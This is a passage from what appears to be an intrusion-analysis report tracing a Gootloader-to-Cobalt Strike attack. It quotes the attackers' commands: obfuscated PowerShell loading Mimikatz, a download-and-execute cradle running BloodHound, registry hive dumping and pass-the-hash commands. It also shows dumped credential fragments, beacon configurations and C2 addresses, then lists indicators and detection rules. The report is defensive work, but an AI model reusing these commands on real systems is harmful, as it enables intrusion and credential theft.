Initiating Process Folder Path\n  FileCreated      C:\\Users\\[redacted]   mi.ps1      c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe\n```\n\nAnother PowerShell command was used to trigger the mi.ps1 script. The script was using XOR-encoding.\n\n```image\nAlt: XOR Encoding\nDescription: The image depicts a detailed output related to a PowerShell process creation event. It includes a command line that shows the execution of a PowerShell script with various parameters and encoded elements. The command appears to be part of a malicious activity, possibly related to credential access or exploitation. Key elements include the use of '-nop', '-noninteractive', and '-ep bypass' flags, along with a script block creation and a base64 encoded string that suggests obfuscation techniques typical in cyber threats.\nTranscription: |\n  TaskCategory          CommandLine\n  Process Create        powershell -nop -noni -ep bypass -w h -c \"$t=([type]'Convert');&([scriptblock]::Create(($t::(($t.GetMethods()|?{$_.Name -clike'F*g'}).Name)('PG01MD9wbGxoJjC3KSoVNjg2KDYpi1oqKi9Nz9kPMWWuUpVODxHMWUxIzxtZDAwX1tOVEFyTFVdMjEjOFFlaHdqbDVVd3xtdH04WyJETWt9amtEMYVIrcHk2dXdrdHlHRVxNmhrKSM4UXZud3N9NVVxdXFzelwx10DVbd3VobWx9a1Z5dX04XF1LU0xXSDVLSeXBTY8u'))%{$_-bxor24}|%{[char]$_})-join'')\"\n```\n\nThis CyberChef recipe can be used to decode the inner encoded command.\n\nThe output lists “Invoke-Mimikatz”, a direct reference to the PowerShell Invoke-Mimikatz.ps1 script used to load Mimikatz DLL directly in memory.\n\n```\n$u=('http://127.0.0.1:22201/'|%{(IRM $_)});$u|&(GCM I*e-E*); Import-Module C:\\Users\\<redacted>\\mi.ps1; Invoke-Mimikatz -ComputerName <redacted>\n```\n\nMonitoring PowerShell event id 4103 we can observe the threat actor’s successful credential access activity from the Mimikatz invocation.\n\n```image\nAlt: Mimikatz\nDescription: The image displays a terminal output related to the Mimikatz tool, specifically its logon passwords command invocation. It reveals detailed authentication information such as the Authentication ID, User Name, Domain, Logon Server, and various Security Identifiers (SIDs). The output also shows encrypted passwords and associated data for different user sessions, which are vital for cybersecurity analysis and understanding credential access methods used by attackers.\nTranscription: |\n  \"CommandInvocation(Out-Default): \"Out-Default\"\n  ParameterBinding(Out-Default): name=\"InputObject\", value=\"\n    .#####.   mimikatz 2.2.0 (x64) #19041 Jul 24 2021 11:00:11\n   .## ^ ##.  \"A La Vie, A L'Amour\"  (oe.eo)\n   ## / \\ ##  /*** Benjamin DELPY 'gentilkiwi' ( benjamin@gentilkiwi.com )\n   ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n   '## v ##'  /*** Vincent LE TOUX             ( vincent.letoux@gmail.com )\n    '#####'       > https://pingcastle.com / https://mysmartlogon.com ***\n  \n  mimikatz(powershell) # sekurlsa::logonpasswords\n  \n  Authentication Id : 0 ; 58533736 (00000000:037d2600)\n  Session           : Interactive from 4\n  User Name         : DWM-4\n  Domain            : Window Manager\n  Logon Server      : (null)\n  Logon Time        : \n  SID               : S-1-5-90-0-4\n  \n          msv :\n           [00000003] Primary\n           * Username : \n           * Domain   : \n           * NTLM     : eb40793              f7177c39\n           * SHA1     : 348211b              5c344070060a76d3\n          tspkg :\n          wdigest :\n           * Username : \n           * Domain   : \n           * Password : (null)\n          kerberos :\n           * Username :                      $\n           * Domain   : .local\n           * Password : &7y`HDCPk_IwQw&^poDZ3aZ,                 -3#Cri2)&s-!&3fi:JT+qg$8^hH6lv4W;\n          ssp :\n          credman :\n          cloudap :\n  \n  Authentication Id : 0 ; 58526506 (00000000:037db02a)\n  Session           : Interactive from 4\n  User Name         : UMFD-4\n  Domain            : Font Driver Host\n  Logon Server      : (null)\n  Logon Time        : 1/31/2022 4:32:26 PM\n  SID               : S-1-5-96-0-4\n  \n          msv :\n           [00000003] Primary\n           * Username :\n```\n\nIn addition, the post-exploitation tool “LaZagne” (renamed to ls.exe) was used with the “-all” switch.\n\n```\nls.exe all -oN -output C:\\Users\\REDACTED\n```\n\nThis will dump passwords (browsers, LSA secret, hashdump, Keepass, WinSCP, RDPManager, OpenVPN, Git, etc.) and store the output file (in our case) in the “C:\\Users” directory. When LaZagne is run with admin privileges, it also attempts to dump credentials from local registry hives, as can be seen below.\n\n```image\nAlt: LaZagne\nDescription: The image displays a table with command line entries related to security processes. It includes commands executed via cmd.exe that save registry hives (security, sam, and system) to specific temporary directory locations on a Windows system. Each command line entry is shown along with its parent command line, indicating the context of execution, which is relevant for analyzing cyber threats and understanding credential access activities.\nTranscription: |\n  CommandLine                                                                                 ParentCommandLine\n  cmd.exe /c \"reg.exe save hklm\\security c:\\windows\\temp\\xoeofpxxon\"                          ls.exe all -oN -output C:\\Users\n  cmd.exe /c \"reg.exe save hklm\\sam c:\\windows\\temp\\nibkqjzy\"                                 ls.exe all -oN -output C:\\Users\n  cmd.exe /c \"reg.exe save hklm\\system c:\\windows\\temp\\nfwlgripmy\"                           ls.exe all -oN -output C:\\Users\n```\n\nHere’s the commands from another system:\n\n```\ncmd.exe /c \"reg.exe save hklm\\sam c:\\users\\REDACTED\\appdata\\local\\temp\\1\\dznuxujzr\"\ncmd.exe /c \"reg.exe save hklm\\system c:\\users\\REDACTED\\appdata\\local\\temp\\1\\mkffdg\"\ncmd.exe /c \"reg.exe save hklm\\security c:\\users\\REDACTED\\appdata\\local\\temp\\1\\iszmqwmjemt\"\n```\n\n## Discovery\n\nThe threat actors used the PowerShell implementation of SharpHound (Bloodhound) on the beachhead host to enumerate the Active Directory domain. The Cobalt Strike beacon was used to invoke the PowerShell script.\n\n```\npowershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAxADAAMAA0ADkALwAnACkAOwAgAEkAbgB2AG8AawBlAC0AQgBsAG8AbwBkAEgAbwB1AG4AZAAgAC0AQwBvAGwAbABlAGMAdABpAG8AbgBNAGUAdABoAG8AZAAgAEEAbABsAA==\n```\n\n```image\nAlt: SharpHound\nDescription: The image shows a web interface for decoding Base64 encoded text. On the left side, there is an input area labeled 'Input' where the Base64 encoded string is displayed. Below it, there is a section titled 'Output' which shows the decoded result. The output reveals a PowerShell command that uses 'Invoke-BloodHound' to collect Active Directory data from a specified IP address. The interface includes options for adjusting the decoding parameters, such as the encoding type.\nTranscription: |\n  Recipe\n  \n  From Base64\n  Alphabet\n  A-Za-z0-9+/=\n  \n  [ ] Remove non-alphabet chars\n  \n  Decode text\n  Encoding\n  UTF-16LE (1200)\n  \n  Input\n  SQBFAFgAIABoAE4AZQB3AG8AbAAtTwBiAGoAZQBjAHQAIABOAGUAdwBCAHgALgBGAE8AdwBuAGQAbwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA\n  nAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMQAwADoANQAwADQAMgAnACkAIABJAG4AdgBvAGsAZQAtAEIAbABvAG8AZABoAG8AdQBuAGQAI\n  AAtAEMAbwBsAGwAZQBjAHQAaQBvAG4ATQBlAHQAcgBvAGQAIABBAGwAbAA=\n  \n  Output\n  IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:10040/'); Invoke-BloodHound -CollectionMethod All\n```\n\nThey also ran a WMI command on the beachhead host and one other host to check for AntiVirus.\n\n```\nWMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List\n```\n\nThe threat actors executed this command remotely on a domain controller, before moving laterally to it:\n\n```\npowershell.exe ls C:\\ > C:\\file.txt\n```\n\nWhile having an interactive RDP session, in an attempt to collect more information regarding the host, the attackers used PowerShell to run systeminfo on one of the hosts they pivoted to.\n\nOn the last day, and before they left the network, threat actors used Advanced IP Scanner to scan the whole network for the below open ports:\n\n```\n21,80,135,443,445,3389,8080,56133,58000,58157,58294,58682,60234,60461,64502\n```\n\n```image\nAlt: Advanced IP Scanner\nDescription: The image displays a structured log table containing security event data related to the execution of the Advanced IP Scanner tool. It includes columns such as EventCode, TaskCategory, TargetFilename, ParentImage, and CommandLine. The log entries provide details about file creation and process initiation associated with the Advanced IP Scanner executable, indicating how the tool was run and its parent processes. This log is relevant for tracking malicious activity and understanding lateral movement within a network.\nTranscription: |\n  plaintext\n  EventCode  TaskCategory                          TargetFilename                                                         ParentImage                                    CommandLine\n  11         File created                          C:\\Users\\████\\Advanced_IP_Scanner_2.5.3850.exe                         C:\\Windows\\explorer.exe                        \"C:\\Users\\████\\Advanced_IP_Scanner_2.5.3850.exe\"\n             (rule: FileCreate)\n  \n  1          Process Create                        C:\\Users\\████\\Advanced_IP_Scanner_2.5.3850.exe                         C:\\Users\\████\\AppData\\Local\\Temp\\1\\is-JN8UC.tmp\\Advanced_IP_Scanner_2.5.3850.tmp\n             (rule: ProcessCreate)                                                                                       \"C:\\Users\\████\\AppData\\Local\\Temp\\1\\is-JN8UC.tmp\\Advanced_IP_Scanner_2.5.3850.tmp\" /SL5=\"$7025C,19765324,139776,C:\\Users\\████\\Advanced_IP_Scanner_2.5.3850.exe\"\n  \n  1          Process Create                        C:\\Users\\████\\AppData\\Local\\Temp\\1\\Advanced IP Scanner                C:\\Users\\████\\AppData\\Local\\Temp\\1\\is-JN8UC.tmp\\Advanced_IP_Scanner_2.5.3850.tmp\n             (rule: ProcessCreate)                                                                                       \"C:\\Users\\████\\AppData\\Local\\Temp\\1\\Advanced IP Scanner 2\\advanced_ip_scanner.exe\" /portable \"C:\\Users\\████\\\" /lng en_us\n```\n\n## Lateral Movement\n\n```image\nAlt: Lateral Movement\nDescription: The image presents a flowchart titled 'Lateral Movement' that visually maps out the techniques used for lateral movement in a cybersecurity context. It details methods such as using Cobalt Strike, Remote Desktop Protocol (RDP), Windows Management Instrumentation (WMI), and PSExec. Each method is outlined with specific actions, including copying and executing Cobalt Strike, RDP usage through a Cobalt Strike proxy, executing commands via WMI, and commands executed to enable 'Restricted Admin Mode'. The layout is structured to provide a clear understanding of the relationships and processes involved in lateral movement during cyber intrusions.\nTranscription: |\n  Lateral Movement\n  \n  Cobalt Strike\n    \\\\COMPUTER\\ADMIN$\\2c075ae.exe\n    Cobalt Strike Copied to ADMIN$ and Executed via Service\n  \n  Remote Desktop Protocol\n    Remote Desktop via Cobalt Strike Proxy\n    RDP into Servers through a Cobalt Strike Beacon proxy from the beachhead\n  \n  WMI\n    Execute Commands on Remote Hosts via WMI\n    Commands Executed to Enable Restricted Admin Mode\n  \n  PSExec\n    Execute Commands on Remote Hosts via PSExec\n    Commands Executed to Enable Restricted Admin Mode\n```\n\nAs observed in many of our intrusions, the threat actor created and installed Windows services to deploy Cobalt Strike beacons. This method was used to pivot to other systems within the network.\n\n```image\nAlt: Windows Services\nDescription: The image is a screenshot of a Windows Event Log, specifically showing details for Event ID 7045, which indicates that a service has been installed in the system. The log includes fields such as LogName, EventCode, ComputerName, Service File Name, Service Type, Start Type, and Service Account. The Service File Name contains a PowerShell command that has been obfuscated, hinting at malicious activity. This log entry is relevant for understanding the deployment of potentially harmful services in a cybersecurity context.\nTranscription: |\n  LogName=System\n  EventCode=7045\n  EventType=4\n  ComputerName=XXXXXXXX\n  User=NOT_TRANSLATED\n  Sid=S-1-5-21-805815327-460989457-326783143-1113\n  SidType=0\n  SourceName=Microsoft-Windows-Service Control Manager\n  Type=Information\n  RecordNumber=1663\n  Keywords=Classic\n  TaskCategory=None\n  OpCode=The operation completed successfully.\n  Message=A service was installed in the system.\n  \n  Service Name:  a17bf34\n  Service File Name:  %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzADAAtgB1AHcALQBPGAt1AGwAdAAgAEkATwAuAE0AZQBpAGUAaQB1AGYQBtACgB5AFMAwBuAHYAZQB0AG0AOAArBgAGAABgACgAEAwB1ADYANABTAHQAcQBpAG4AZGwA...\n```\n\nSMB was also used to transfer executable Cobalt Strike beacons to various workstations in the environment.\n\n```image\nAlt: SMB Transfer\nDescription: The image is a tabular data representation showing network traffic details related to executable files involved in a cyber intrusion. It includes columns for source IP, source port, destination IP, destination port, number of packets, total data transmitted in bytes, and associated filenames (e.g., 6bb6ca2.exe, a4a375e.exe, 2c075ae.exe). The data appears to provide insights into the communication patterns and file transfers between systems during the lateral movement phase of an attack.\nTranscription: |\n  | Src IP / Country | Src Port | Dst IP / Country | Dst Port | Packets | Databytes / Bytes | Info                   |\n  | ---------------- | -------- | ---------------- | -------- | ------- | ----------------- | ---------------------- |\n  | 10.              | 57943    | 10.              | 445      | 874     | 827,446           | Filename > 6bbc6a2.exe |\n  |                  |          |                  |          |         | 874,666           |                        |\n  | 10.              | 61386    | 10.              | 445      | 892     | 829,032           | Filename > a4a375e.exe |\n  |                  |          |                  |          |         | 877,224           |                        |\n  | 10.              | 61745    | 10.              | 445      | 1,023   | 843,404           | Filename > 2c075ae.exe |\n  |                  |          |                  |          |         | 898,670           |                        |\n```\n\nThese executables were then executed by a remote service visible in the windows event id 7045 logs.\n\n```image\nAlt: Event Logs\nDescription: The image depicts a log entry that details the installation of a Windows service. It includes specific information such as the service name ('6bb6ca2'), service file name ('\\ADMINb6ca2.exe'), service type (user mode service), service start type (demand start), and service account (LocalSystem). This information is pertinent for analyzing potential malicious activity within a network, particularly related to the deployment of malware or unauthorized services.\nTranscription: |\n  \"A service was installed in the system.\n  \n  Service Name: 6bb6ca2\n  Service File Name: \\\\               \\ADMIN$\\6bb6ca2.exe\n  Service Type: user mode service\n  Service Start Type: demand start\n  Service Account: LocalSystem\"\n```\n\nNext to deploying Cobalt Strike beacons, the threat actor also used RDP to establish interactive sessions with various hosts on the network. One important aspect of these sessions is that the threat actor authenticated using “Restricted Admin Mode”.\n\nRestricted Admin Mode can be considered a double-edged sword; although it prevents credential theft, it also enables an attacker to perform a pass-the-hash attack using RDP. In other words, after enabling Restricted Admin Mode, just the NTLM hash of the remote desktop user is required to establish a valid RDP session, without the need of possessing the clear password.\n\nThe threat actor attempted to use both Invoke-WMIExec and psexec to enable “Restricted Admin Mode”.\n\n```\npsexec \\\\<redacted> -u <redacted>\\<redacted> -p <redacted> reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0\n```\n\n```\npowershell -nop -noni -ep bypass -w h -c \"$u=('http://127.0.0.1:47961/'|%%{(IRM $_)});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module C:\\Users\\<redacted>\\Invoke-WMIExec.ps1; Invoke-WMIExec -Target <redacted> -Domain <redacted> -Username <redacted> -Hash <redacted> -Command \"powershell.exe New-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' -Name 'DisableRestrictedAdmin' -Value 0 -PropertyType DWORD\" -verbose\"\n```\n\nThe logon information of EventID 4624 includes a field “Restricted Admin Mode”, which is set to the value “Yes” if the feature is used.\n\n```image\nAlt: Restricted Admin Mode\nDescription: The image displays a Windows Event Log entry for Event ID 4624, indicating a successful logon event. It contains detailed information such as the Logon Type, Security ID, Account Name, and notable mention of 'Restricted Admin Mode' being set to 'Yes'. This log entry is significant for tracking authentication methods used by threat actors and understanding their techniques, particularly in the context of lateral movement within a network.\nTranscription: |\n  LogName=Security\n  EventCode=4624\n  EventType=0\n  ComputerName=████████\n  SourceName=Microsoft Windows security auditing.\n  Type=Information\n  RecordNumber=31774\n  Keywords=Audit Success\n  TaskCategory=Logon\n  OpCode=Info\n  Message=An account was successfully logged on.\n  \n  Subject:\n      Security ID:        S-1-5-18\n      Account Name:       ████████\n      Account Domain:     ████████\n      Logon ID:           0x3E7\n  \n  Logon Information:\n      Logon Type:         10\n      Restricted Admin Mode:    Yes\n      Virtual Account:    No\n      Elevated Token:     Yes\n  \n  Impersonation Level:    Impersonation\n  \n  New Logon:\n      Security ID:        ████████\n      Account Name:       ████████\n      Account Domain:     ████████\n      Logon ID:           0x3798A24\n      Linked Logon ID:    0x0\n      Network Account Name:    -\n      Network Account Domain:  -\n      Logon GUID:         {00000000-0000-0000-0000-000000000000}\n  \n  Process Information:\n      Process ID:         0x3fc\n      Process Name:       C:\\Windows\\System32\\svchost.exe\n  \n  Network Information:\n      Workstation Name:   -\n      Source Network Address:  ████████\n      Source Port:        0\n  \n  Detailed Authentication Information:\n      Logon Process:      User32\n      Authentication Package:   Negotiate\n      Transited Services:   -\n      Package Name (NTLM only): -\n      Key Length:         0\n```\n\n## Collection\n\nThe threat actor accessed multiple files during the RDP sessions on multiple servers. In one instance document files were opened directly on the system.\n\n```image\nAlt: Document Access\nDescription: The image is a table displaying details of processes created during a cyber incident. It contains three columns: 'Action Type,' 'Initiating Process Command Line,' and 'Process Command Line.' The 'Action Type' indicates that 'ProcessCreated' occurred twice, both initiated by 'Explorer.EXE.' The 'Process Command Line' details that 'WORDPAD.EXE' was used to open two document files located in a specified directory, with the file paths partially redacted.\nTranscription: |\n  Action Type       Initiating Process Command Line   Process Command Line\n  ProcessCreated    Explorer.EXE                      \"WORDPAD.EXE\" \"C:\\████\\Contracts\\████████.docx\"\n  ProcessCreated    Explorer.EXE                      \"WORDPAD.EXE\" \"C:\\████\\Contracts\\████████.docx\"\n```\n\nShellbags revealed attempts to enumerate multiple file shares containing information of interest to the threat actor.\n\n```image\nAlt: File Shares\nDescription: The image depicts a screenshot of a file directory structure, showing folders labeled 'IT,' 'Passwords,' and 'Contracts' under the 'Computers and Devices' section on a desktop interface. The screenshot includes icons representing directories and appears to display information related to file enumeration, which is relevant to the context of the threat actor's activities in accessing files during RDP sessions.\nTranscription: |\n  Value\n  Desktop\n    Computers and Devices\n      [Redacted]\n        IT\n          Passwords\n        Contracts\n        [Redacted]\n  \n  Drag a column header here to group by that column\n  \n  Value      Icon        Shell Type\n  [Redacted] No image    [Redacted]\n  Contracts  Directory   Directory\n  IT         Directory   Directory\n```\n\n## Command and Control\n\n### Gootloader\n\nGootloader second stage download URLs. These URLs were deobfuscated and extracted using this script by HP Threat Research. They’ve updated this script at least a few times now, thanks @hpsecurity and thanks to @GootLoaderSites for sharing on twitter as its broken/fixed.\n\n```\nhxxps://kakiosk.adsparkdev[.]com/test.php?hjkiofilihyl=\nhxxps://jp.imonitorsoft[.]com/test.php?hjkiofilihyl=\nhxxps://junk-bros[.]com/test.php?hjkiofilihyl=\n```\n\nDuring the intrusion, the Gootloader loader was observed communicating to 35.206.117.64:443 kakiosk[.]adsparkdev[.]com.\n\n```\nJa3:a0e9f5d64349fb13191bc781f81f42e1\nJa3s:567bb420d39046dbfd1f68b558d86382\nCertificate: [d8:85:d1:48:a2:99:f5:ee:9d:a4:3e:01:1c:b0:ec:12:e5:23:7d:61 ]\nNot Before: 2022/01/05 09:25:33 UTC\nNot After: 2022/04/05 09:25:32 UTC\nIssuer Org: Let's Encrypt\nSubject Common: kakiosk.adsparkdev.com [kakiosk.adsparkdev.com ,www.kakiosk.adsparkdev.com ]\nPublic Algorithm: rsaEncryption\n```\n\n### Cobalt Strike\n\n**146.70.78.43**\n\nCobalt Strike server TLS configuration:\n\n```\n146.70.78.43\nJa3:72a589da586844d7f0818ce684948eea\nJa3s:f176ba63b4d68e576b5ba345bec2c7b7\nSerial Number: 146473198 (0x8bb00ee)\nCertificate: 73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F\nNot Before: May 20 18:26:24 2015 GMT\nNot After: May 17 18:26:24 2025 GMT\nIssuer:  C=, ST=, L=, O=, OU=, CN=\nSubject:  C=, ST=, L=, O=, OU=, CN=\nPublic Algorithm: rsaEncryption\n```\n\nCobalt Strike beacon configuration:\n\n```\nCobalt Strike Beacon:\n  x86:\n    beacon_type: HTTPS\n    dns-beacon.strategy_fail_seconds: -1\n    dns-beacon.strategy_fail_x: -1\n    dns-beacon.strategy_rotate_seconds: -1\n    http-get.client:\n      Cookie\n    http-get.uri: 146.70.78.43,/visit.js\n    http-get.verb: GET\n    http-post.client:\n      Content-Type: application/octet-stream\n      id\n    http-post.uri: /submit.php\n    http-post.verb: POST\n    maxgetsize: 1048576\n    port: 443\n    post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe\n    post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe\n    process-inject.execute:\n      CreateThread\n      SetThreadContext\n      CreateRemoteThread\n      RtlCreateUserThread\n    process-inject.startrwx: 64\n    process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648\n    process-inject.userwx: 64\n    proxy.behavior: 2 (Use IE settings)\n    server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64\n    sleeptime: 60000\n    useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; yie9)\n    uses_cookies: 1\n    watermark: 1580103824\n  x64:\n    beacon_type: HTTPS\n    dns-beacon.strategy_fail_seconds: -1\n    dns-beacon.strategy_fail_x: -1\n    dns-beacon.strategy_rotate_seconds: -1\n    http-get.client:\n      Cookie\n    http-get.uri: 146.70.78.43,/fwlink\n    http-get.verb: GET\n    http-post.client:\n      Content-Type: application/octet-stream\n      id\n    http-post.uri: /submit.php\n    http-post.verb: POST\n    maxgetsize: 1048576\n    port: 443\n    post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe\n    post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe\n    process-inject.execute:\n      CreateThread\n      SetThreadContext\n      CreateRemoteThread\n      RtlCreateUserThread\n    process-inject.startrwx: 64\n    process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648\n    process-inject.userwx: 64\n    proxy.behavior: 2 (Use IE settings)\n    server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64\n    sleeptime: 60000\n    useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENXA)\n    uses_cookies: 1\n    watermark: 1580103824\n```\n\n**37.120.198.225**\n\nCobalt Strike server TLS configuration:\n\n```\nJa3:72a589da586844d7f0818ce684948eea\nJa3s:f176ba63b4d68e576b5ba345bec2c7b7\nSerial Number: 146473198 (0x8bb00ee)\nCertificate: 73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F\nNot Before: May 20 18:26:24 2015 GMT\nNot After : May 17 18:26:24 2025 GMT\nIssuer: C=, ST=, L=, O=, OU=, CN=\nSubject: C=, ST=, L=, O=, OU=, CN=\nPublic Algorithm: rsaEncryption\n```\n\nCobalt Strike beacon configuration:\n\n```\nCobalt Strike Beacon:\n  x86:\n    beacon_type: HTTPS\n    dns-beacon.strategy_fail_seconds: -1\n    dns-beacon.strategy_fail_x: -1\n    dns-beacon.strategy_rotate_seconds: -1\n    http-get.client:\n      Cookie\n    http-get.uri: 37.120.198.225,/cm\n    http-get.verb: GET\n    http-post.client:\n      Content-Type: application/octet-stream\n      id\n    http-post.uri: /submit.php\n    http-post.verb: POST\n    maxgetsize: 1048576\n    port: 443\n    post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe\n    post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe\n    process-inject.execute:\n      CreateThread\n      SetThreadContext\n      CreateRemoteThread\n      RtlCreateUserThread\n    process-inject.startrwx: 64\n    process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648\n    process-inject.userwx: 64\n    proxy.behavior: 2 (Use IE settings)\n    server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64\n    sleeptime: 60000\n    useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts; IE0006_ver1;EN_GB)\n    uses_cookies: 1\n    watermark: 1580103824\n  x64:\n    beacon_type: HTTPS\n    dns-beacon.strategy_fail_seconds: -1\n    dns-beacon.strategy_fail_x: -1\n    dns-beacon.strategy_rotate_seconds: -1\n    http-get.client:\n      Cookie\n    http-get.uri: 37.120.198.225,/ptj\n    http-get.verb: GET\n    http-post.client:\n      Content-Type: application/octet-stream\n      id\n    http-post.uri: /submit.php\n    http-post.verb: POST\n    maxgetsize: 1048576\n    port: 443\n    post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe\n    post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe\n    process-inject.execute:\n      CreateThread\n      SetThreadContext\n      CreateRemoteThread\n      RtlCreateUserThread\n    process-inject.startrwx: 64\n    process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648\n    process-inject.userwx: 64\n    proxy.behavior: 2 (Use IE settings)\n    server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64\n    sleeptime: 60000\n    useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts; IE0006_ver1;EN_GB)\n    uses_cookies: 1\n    watermark: 1580103824\n```\n\nReal Intelligence Threat Analytics (RITA) was successful in locating one of the IP addresses used for Cobalt Strike command and control communications.\n\n```image\nAlt: RITA\nDescription: The image displays a data table generated by RITA (Real Intelligence Threat Analytics) showing network traffic statistics related to Cobalt Strike beacons. It includes columns for score, source IP, destination IP, number of connections, average bytes transferred, interval ranges, size ranges, and their respective modes and counts. The data provides insights into communication patterns with a specific Cobalt Strike server (146.70.78.43), indicating a total of 20,902 connections and an average of 3,883 bytes per connection. This information is critical for analyzing potential command and control activity.\nTranscription: |\n  plaintext\n  Time Generated: Sat, 02 Apr 2022 19:51:10 EDT\n  \n  Score   Source        Destination   Connections   Avg. Bytes   Intvl. Range   Size Range   Intvl. Mode   Size Mode   Intvl. Mode Count   Size Mode Count   Intvl. Skew   Size Skew   Intvl. Dispersion   Size Dispersion   Total Bytes\n  0.995   10.43.61.202  146.70.78.43  20902         3883.000     13780          2567         1             2181        14945               14285             0.000         0.000      0                   0                81180557\n```\n\nNetscan data extracted via Volatility from the beachhead host showing Cobalt Strike C2 connections:\n\n```\nVolatility 3 Framework 2.0.0\n\nOffset  Proto   LocalAddr       LocalPort       ForeignAddr     ForeignPort     State   PID     Owner   Created\n...\n0x948431c46010  TCPv4   10.X.X.X    52670   146.70.78.43    443     CLOSE_WAIT      3420    rundll32.exe   \n0x948431e19010  TCPv4   10.X.X.X   63723   146.70.78.43    443     CLOSED  3420    rundll32.exe    \n0x9484337f18a0  TCPv4   10.X.X.X    52697   146.70.78.43    443     CLOSE_WAIT      3420    rundll32.exe    \n0x948435102050  TCPv4   10.X.X.X    52689   146.70.78.43    443     CLOSE_WAIT      3420    rundll32.exe \n...\n```\n\n## Impact\n\nIn this case, there was no further impact to the environment before the threat actors were evicted.\n\n## Indicators\n\n### Network\n\n**Gootloader** \nhttps://kakiosk.adsparkdev[.]com \nhttps://jp.imonitorsoft[.]com \nhttps://junk-bros[.]com \n35.206.117.64:443\n\n**Cobalt Strike** \n146.70.78.43:443 \n37.120.198.225:443\n\n### File\n\n```\nolympus_plea_agreement 34603 .js\nd7d3e1c76d5e2fa9f7253c8ababd6349\n724013ea6906a3122698fd125f55546eac0c1fe0\n6e141779a4695a637682d64f7bc09973bb82cd24211b2020c8c1648cdb41001b\n\nolympus plea agreement(46196).zip\nb50333ff4e5cbcda8b88ce109e882eeb\n44589fc2a4d1379bee93282bbdb16acbaf762a45\n7d93b3531f5ab7ef8d68fb3d06f57e889143654de4ba661e5975dae9679bbb2c\n\nmi.ps1\nacef25c1f6a7da349e62b365c05ae60c\nc5d134a96ca4d33e96fb0ab68cf3139a95cf8071\nd00edf5b9a9a23d3f891afd51260b3356214655a73e1a361701cda161798ea0b\n\nInvoke-WMIExec.ps1\nb4626a335789e457ea48e56dfbf39710\n62a7656d81789591358796100390799e83428519\nc4939f6ad41d4f83b427db797aaca106b865b6356b1db3b7c63b995085457222\n\nls.exe\n87ae2a50ba94f45da39ec7673d71547c\ndfa0b4206abede8f441fcdc8155803b8967e035c\n8764131983eac23033c460833de5e439a4c475ad94cfd561d80cb62f86ff50a4\n```\n\n## Detections\n\n### Network\n\n```\nET HUNTING Suspicious Empty SSL Certificate - Observed in Cobalt Strike\nET MALWARE Meterpreter or Other Reverse Shell SSL Cert\n```\n\n### Sigma\n\nCustom Sigma rules:\n\n- Deleting Windows Defender scheduled tasks\n- Enabling restricted admin mode\n\nSigma repo rules:\n\n- Bloodhound Detection\n- Powershell download\n- Defender Disable via Powershell\n- Creation of Scheduled Task via Powershell\n- LaZagne LSASS Access\n- Systeminfo Discovery\n- CobaltStrike Named Pipe\n- Malicious PowerShell Commandlets\n- Suspicious Service Installation\n- Suspicious XOR Encoded PowerShell Command Line\n- Too Long PowerShell Commandlines\n- PowerShell Network Connections\n- Rundll32 Internet Connection\n- Mimikatz Use\n\n### Yara\n\nCustom Yara rule\n\n## MITRE\n\n- **T1189** Drive-by Compromise\n- **T1204.001** – User Execution: Malicious Link\n- **T1204.002** – User Execution: Malicious File\n- **T1059.001** – Command and Scripting Interpreter: PowerShell\n- **T1053** – Scheduled Task/Job\n- **T1218.011** – System Binary Proxy Execution: Rundll32\n- **T1555** – Credentials from Password Stores\n- **T1003.001** – OS Credential Dumping: LSASS Memory\n- **T1087** – Account Discovery\n- **T1560** – Archive Collected Data\n- **T1482** – Domain Trust Discovery\n- **T1615** – Group Policy Discovery\n- **T1069** – Permission Groups Discovery\n- **T1018** – Remote System Discovery\n- **T1033** – System Owner/User Discovery\n- **T1021.001** – Remote Services: Remote Desktop Protocol\n- **T1021.006** – Remote Services: Windows Remote Management\n- **T1005** – Data from Local System\n- **T1039** – Data from Network Shared Drive\n- **T1046** – Network Service Scanning\n- **T1562.001** – Impair Defenses: Disable or Modify Tools\n- **T1518.001** – Security Software Discovery\n- **T1071.001** Web Protocols\n- **T1027** – Obfuscated Files or Information",
    "sigma_rule": {
